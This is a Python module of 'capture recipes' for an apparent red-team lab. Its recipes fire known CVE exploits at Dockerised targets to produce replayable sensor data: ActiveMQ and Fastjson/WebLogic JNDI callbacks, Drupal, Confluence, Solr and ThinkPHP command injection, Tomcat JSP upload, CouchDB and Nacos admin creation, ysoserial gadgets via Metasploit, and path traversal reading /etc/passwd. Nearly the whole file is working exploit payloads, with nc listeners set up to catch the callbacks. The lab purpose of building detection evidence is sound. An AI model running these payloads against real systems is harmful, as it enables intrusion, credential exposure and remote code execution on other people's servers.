"""Deterministic red-data capture recipes for replayable lab evidence.

These recipes are deliberately separate from model-directed red evaluation.
They generate a known attack transaction and require a machine-readable success
marker before the resulting sensor data can be considered for certification.
The marker is an execution control only; it is never added to observed target
telemetry.  Capture validity remains the responsibility of the independent
scenario signal validator.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class CaptureRecipe:
    command: str
    success_pattern: str = r"(?m)^__PORTAL_RECIPE_OK__$"
    postcondition_command: str = ""
    postcondition_pattern: str = ""
    host_setup_command: str = ""
    host_setup_pattern: str = ""
    host_cleanup_command: str = ""


CAPTURE_RECIPES: dict[str, CaptureRecipe] = {
    "vuln_activemq_deserial": CaptureRecipe(
        command=r"""out=$(python3 /vulhub/activemq/CVE-2023-46604/poc.py "$TARGET_HOST" "$TARGET_PORT" "http://$TARGET_HOST:16666/poc.xml" 2>&1); printf '%s\n' "$out"; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/activeMQ-RCE-success && echo PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success",
        host_setup_command=r"""sh -lc 'test ! -f /tmp/portal-activemq-http.pid || kill $(cat /tmp/portal-activemq-http.pid) 2>/dev/null || true; cd /opt/vulhub/activemq/CVE-2023-46604; nohup python3 -m http.server 16666 --bind 0.0.0.0 >/tmp/portal-activemq-http.log 2>&1 </dev/null & echo $! >/tmp/portal-activemq-http.pid; sleep 1; test -s /tmp/portal-activemq-http.pid && echo PORTAL_HOST_SETUP:activemq-http' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:activemq-http",
        host_cleanup_command=r"""sh -lc 'test ! -f /tmp/portal-activemq-http.pid || kill $(cat /tmp/portal-activemq-http.pid) 2>/dev/null || true; rm -f /tmp/portal-activemq-http.pid' """,
    ),
    "vuln_fastjson_rce": CaptureRecipe(
        command=r"""payload='{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://$TARGET_HOST:16668/Exploit","autoCommit":true}}'; code=$(curl -sS --max-time 30 -o /tmp/portal-fastjson-response -w '%{http_code}' -X POST "http://$TARGET_HOST:$TARGET_PORT/" -H 'Content-Type: application/json' --data "$payload" || true); printf 'HTTP=%s\n' "$code"; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r"""sh -lc 'for i in 1 2 3 4 5; do test -s /tmp/portal-fastjson-rmi.log && { echo PORTAL_TARGET_POSTCONDITION:fastjson-rmi-callback; exit 0; }; sleep 1; done; exit 1' """,
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:fastjson-rmi-callback",
        host_setup_command=r"""sh -lc 'test ! -f /tmp/portal-fastjson-rmi.pid || kill $(cat /tmp/portal-fastjson-rmi.pid) 2>/dev/null || true; : >/tmp/portal-fastjson-rmi.log; nohup timeout 120 nc -l 16668 >/tmp/portal-fastjson-rmi.log 2>&1 </dev/null & echo $! >/tmp/portal-fastjson-rmi.pid; sleep 1; test -s /tmp/portal-fastjson-rmi.pid && echo PORTAL_HOST_SETUP:fastjson-rmi' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:fastjson-rmi",
        host_cleanup_command=r"""sh -lc 'test ! -f /tmp/portal-fastjson-rmi.pid || kill $(cat /tmp/portal-fastjson-rmi.pid) 2>/dev/null || true; rm -f /tmp/portal-fastjson-rmi.pid' """,
    ),
    "vuln_weblogic_rce": CaptureRecipe(
        command=r"""out=$(python3 /opt/POC_CVE-2023-21839/CVE-2023-21839.py -ip "$TARGET_HOST" -p "$TARGET_PORT" -l "ldap://$TARGET_HOST:16667/Exploit" 2>&1); printf '%s\n' "$out"; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r"""sh -lc 'for i in 1 2 3 4 5; do test -s /tmp/portal-weblogic-ldap.log && { echo PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback; exit 0; }; sleep 1; done; exit 1' """,
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback",
        host_setup_command=r"""sh -lc 'test ! -f /tmp/portal-weblogic-ldap.pid || kill $(cat /tmp/portal-weblogic-ldap.pid) 2>/dev/null || true; : >/tmp/portal-weblogic-ldap.log; nohup timeout 120 nc -l 16667 >/tmp/portal-weblogic-ldap.log 2>&1 </dev/null & echo $! >/tmp/portal-weblogic-ldap.pid; sleep 1; test -s /tmp/portal-weblogic-ldap.pid && echo PORTAL_HOST_SETUP:weblogic-ldap' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:weblogic-ldap",
        host_cleanup_command=r"""sh -lc 'test ! -f /tmp/portal-weblogic-ldap.pid || kill $(cat /tmp/portal-weblogic-ldap.pid) 2>/dev/null || true; rm -f /tmp/portal-weblogic-ldap.pid' """,
    ),
    "vuln_laravel_rce": CaptureRecipe(
        command=r"""out=$(msfconsole -q -x "use exploit/multi/php/ignition_laravel_debug_rce; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-laravel-proof; check; run; exit -y" 2>&1); printf '%s\n' "$out" | tail -100; printf '%s' "$out" | grep -q 'target appears to be vulnerable' && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-laravel-proof && echo PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof",
    ),
    "vuln_wordpress_rce": CaptureRecipe(
        command=r"""host='target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}portal-wordpress-proof}} null)'; curl -sS --max-time 30 -H "Host: $host" -X POST "http://$TARGET_HOST:$TARGET_PORT/wp-login.php?action=lostpassword" --data 'wp-submit=Get+New+Password&redirect_to=&user_login=admin' >/dev/null; echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-wordpress-proof && echo PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof",
        host_setup_command=r"""sh -lc 'base=http://127.0.0.1:$TARGET_PORT; host=$TARGET_HOST:$TARGET_PORT; for i in $(seq 1 30); do page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-admin/install.php" 2>/dev/null || true); test -n "$page" && break; sleep 2; done; if printf "%s" "$page" | grep -q "language-chooser"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=1" -d "language=" >/dev/null; fi; page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php"); if ! printf "%s" "$page" | grep -q "user_login"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=2" --data-urlencode "weblog_title=PortalLab" --data-urlencode "user_name=admin" --data-urlencode "admin_password=PortalLab1!" --data-urlencode "admin_password2=PortalLab1!" --data-urlencode "admin_email=portal@example.invalid" --data-urlencode "blog_public=0" --data-urlencode "Submit=Install WordPress" >/dev/null; fi; curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php" | grep -q "user_login" && echo PORTAL_HOST_SETUP:wordpress-installed' """,
        host_setup_pattern=r"PORTAL_HOST_SETUP:wordpress-installed",
    ),
    "vuln_confluence_rce": CaptureRecipe(
        command=r"""url="http://$TARGET_HOST:$TARGET_PORT/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"; out=$(curl -sS -i --max-time 30 "$url"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'X-Cmd-Response: uid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_drupal_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data-urlencode 'form_id=user_register_form' --data-urlencode '_drupal_ajax=1' --data-urlencode 'mail[#post_render][]=exec' --data-urlencode 'mail[#type]=markup' --data-urlencode 'mail[#markup]=id'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_solr_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT/solr"; cores=$(curl -sS --max-time 30 "$base/admin/cores?wt=json"); core=$(printf '%s' "$cores" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(next(iter(d["status"])))'); test -n "$core" || exit 1; curl -sS --max-time 30 -X POST "$base/$core/config" -H 'Content-Type: application/json' --data '{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}' >/dev/null; tpl='%23set($x=%27%27)%23set($rt=$x.class.forName(%27java.lang.Runtime%27))%23set($chr=$x.class.forName(%27java.lang.Character%27))%23set($str=$x.class.forName(%27java.lang.String%27))%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'; out=$(curl -g -sS --max-time 30 "$base/$core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=$tpl"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_grafana_lfi": CaptureRecipe(
        command=r"""out=$(curl -sS --path-as-is --max-time 30 "http://$TARGET_HOST:$TARGET_PORT/public/plugins/alertlist/../../../../../../../../etc/passwd"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_tomcat_deploy": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; jsp='<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec("id"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){out.println(l);} %>'; code=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X PUT --data-binary "$jsp" "$base/portal-proof.jsp/"); out=$(curl -sS --max-time 30 "$base/portal-proof.jsp"); printf 'PUT=%s\n%s\n' "$code" "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_couchdb_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; user="portalproof$(date +%s)"; body=$(printf '{"type":"user","name":"%s","roles":["_admin"],"roles":[],"password":"portal-proof"}' "$user"); created=$(curl -sS --max-time 30 -X PUT "$base/_users/org.couchdb.user:$user" -H 'Content-Type: application/json' --data "$body"); auth=$(printf '%s' "$user:portal-proof" | base64 | tr -d '\n'); verified=$(curl -sS --max-time 30 -H "Authorization: Basic $auth" "$base/_all_dbs"); printf '%s\n%s\n' "$created" "$verified"; printf '%s' "$created" | grep -q '"ok":true' && printf '%s' "$verified" | grep -q '_users' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_elasticsearch_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; curl -sS --max-time 30 -X POST "$base/website/blog/" -H 'Content-Type: application/json' --data '{"name":"portal-proof"}' >/dev/null; curl -sS --max-time 30 -X POST "$base/_refresh" >/dev/null; out=$(curl -sS --max-time 30 -X POST "$base/_search?pretty" -H 'Content-Type: application/json' --data '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_redis_unauth": CaptureRecipe(
        command=r"""out=$(redis-cli -h "$TARGET_HOST" -p "$TARGET_PORT" INFO server 2>&1); cfg=$(redis-cli -h "$TARGET_HOST" -p "$TARGET_PORT" CONFIG GET dir 2>&1); printf '%s\n%s\n' "$out" "$cfg"; printf '%s' "$out" | grep -q 'redis_version:' && printf '%s' "$cfg" | grep -q '/data' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_nacos_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT/nacos"; user=portalproof; listed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=10"); created=$(curl -sS --max-time 30 -X POST -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?username=$user&password=portalproof"); confirmed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=20"); login=$(curl -sS --max-time 30 -X POST "$base/v1/auth/users/login?username=nacos&password=nacos"); printf '%s\n%s\n%s\n%s\n' "$listed" "$created" "$confirmed" "$login"; printf '%s' "$created" | grep -q 'create user ok' && printf '%s' "$confirmed" | grep -q 'portalproof' && printf '%s' "$login" | grep -Eq 'accessToken|globalAdmin' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_gitea_rce": CaptureRecipe(
        command=r"""body='{"Oid":"....../../../etc/passwd","Size":1000,"User":null,"Password":null,"Repo":"a/b","Authorization":""}'; out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/a/b.git/info/lfs/objects" -H 'Content-Type: application/json' --data "$body"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_joomla_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 30 "http://$TARGET_HOST:$TARGET_PORT/api/index.php/v1/config/application?public=true"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '"(password|db|user)"' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_nexus_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --path-as-is --max-time 30 "http://$TARGET_HOST:$TARGET_PORT/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_django_sqli": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; out=$(curl -sS --max-time 30 --get "$base/" --data-urlencode "date=xxxx'xxxx"); printf '%s\n' "$out" | grep -Eim 5 'syntax error|database error|programmingerror|unterminated'; printf '%s' "$out" | grep -Eqi 'syntax error|database error|programmingerror|unterminated' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_thinkphp_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/index.php?s=captcha" --data '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'); printf '%s\n' "$out" | grep -Em 5 'uid=[0-9]+\('; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_rails_rce": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 30 -H 'Accept: ../../../../../../../../etc/passwd{{' "http://$TARGET_HOST:$TARGET_PORT/robots"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_phpmyadmin_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; curl -sS --max-time 30 -c /tmp/portal-pma.cookies "$base/" >/dev/null; out=$(curl -sS --path-as-is --max-time 30 -b /tmp/portal-pma.cookies "$base/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"); printf '%s\n' "$out" | grep -Em 5 'root:x:0:0:'; printf '%s' "$out" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_nginx_lfi": CaptureRecipe(
        command=r"""out=$(python3 /vulhub/nginx/CVE-2017-7529/poc.py "http://$TARGET_HOST:$TARGET_PORT/" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'KEY:|HTTP/1\.[01] 200|Content-Type:' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_zabbix_rce": CaptureRecipe(
        command=r"""url="http://$TARGET_HOST:$TARGET_PORT/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml%280%2Cconcat%280xa%2Cuser%28%29%29%2C0%29"; out=''; for i in 1 2 3 4 5 6 7 8 9 10; do out=$(curl -sS --max-time 30 "$url"); printf '%s' "$out" | grep -Eqi 'XPATH syntax error|root@|zabbix@' && break; sleep 2; done; printf '%s\n' "$out" | grep -Eim 5 'XPATH syntax error|root@|zabbix@'; printf '%s' "$out" | grep -Eqi 'XPATH syntax error|root@|zabbix@' && echo __PORTAL_RECIPE_OK__"""
    ),
    "vuln_spring_actuator": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; sed "s#http://your-ip:8080#$base#" /vulhub/spring/CVE-2018-1270/exploit.py >/tmp/portal-spring-exploit.py; out=$(python3 /tmp/portal-spring-exploit.py 2>&1); printf '%s\n' "$out"; test "$(printf '%s' "$out" | grep -c 'data success')" -ge 3 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/success && echo PORTAL_TARGET_POSTCONDITION:spring-rce:/tmp/success'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:spring-rce:/tmp/success",
    ),
    "vuln_gitlab_rce": CaptureRecipe(
        command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; page=''; for i in $(seq 1 48); do page=$(curl -sS --max-time 10 "$base/users/sign_in" 2>/dev/null || true); printf '%s' "$page" | grep -q 'csrf-token' && break; sleep 5; done; printf '%s' "$page" | grep -q 'csrf-token' || exit 1; out=$(python3 /vulhub/gitlab/CVE-2021-22205/poc.py "$base" 'touch /tmp/portal-gitlab-proof' 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -q 'finish test' && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-gitlab-proof && echo PORTAL_TARGET_POSTCONDITION:gitlab-rce:/tmp/portal-gitlab-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:gitlab-rce:/tmp/portal-gitlab-proof",
    ),
    "vuln_dubbo_rce": CaptureRecipe(
        command=r"""java --add-opens java.base/java.util=ALL-UNNAMED -jar /opt/ysoserial/ysoserial.jar CommonsCollections6 'touch /tmp/portal-dubbo-proof' >/tmp/portal-dubbo.poc 2>/dev/null; test -s /tmp/portal-dubbo.poc || exit 1; code=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X POST --data-binary @/tmp/portal-dubbo.poc "http://$TARGET_HOST:$TARGET_PORT/org.vulhub.api.CalcService"); printf 'HTTP=%s\n' "$code"; test "$code" != 000 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-dubbo-proof && echo PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof",
    ),
    "vuln_shiro_deserial": CaptureRecipe(
        command=r"""msfconsole -q -x "use exploit/multi/http/shiro_rememberme_v124_deserialize; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set JAVA_GADGET_CHAIN CommonsBeanutils1; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-shiro-proof; run; exit -y" 2>&1 | tail -80; test "${PIPESTATUS:-0}" != 1 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-shiro-proof && echo PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof",
    ),
    "vuln_jackson_deserial": CaptureRecipe(
        command=r"""python3 -c 'from pathlib import Path; blocks=Path("/vulhub/jackson/CVE-2017-7525/README.md").read_text().split("```"); b=next(b for b in blocks if "transletBytecodes" in b); print(b[b.index("{"):b.rindex("}")+1])' >/tmp/portal-jackson.json; code=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X POST "http://$TARGET_HOST:$TARGET_PORT/exploit" -H 'Content-Type: application/json' --data-binary @/tmp/portal-jackson.json); printf 'HTTP=%s\n' "$code"; test "$code" != 000 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/prove1.txt && echo PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt",
    ),
}


def render_recipe_command(recipe: CaptureRecipe, *, host: str, port: int) -> str:
    """Resolve only the two runtime placeholders owned by the lab gate."""
    return recipe.command.replace("$TARGET_HOST", host).replace("$TARGET_PORT", str(port))


def render_postcondition_command(recipe: CaptureRecipe, *, port: int) -> str:
    """Resolve the target container's published-port placeholder."""
    return recipe.postcondition_command.replace("$TARGET_PORT", str(port))


def render_host_command(recipe_command: str, *, host: str, port: int) -> str:
    """Resolve runtime target placeholders in a host-side helper command."""
    return recipe_command.replace("$TARGET_HOST", host).replace("$TARGET_PORT", str(port))
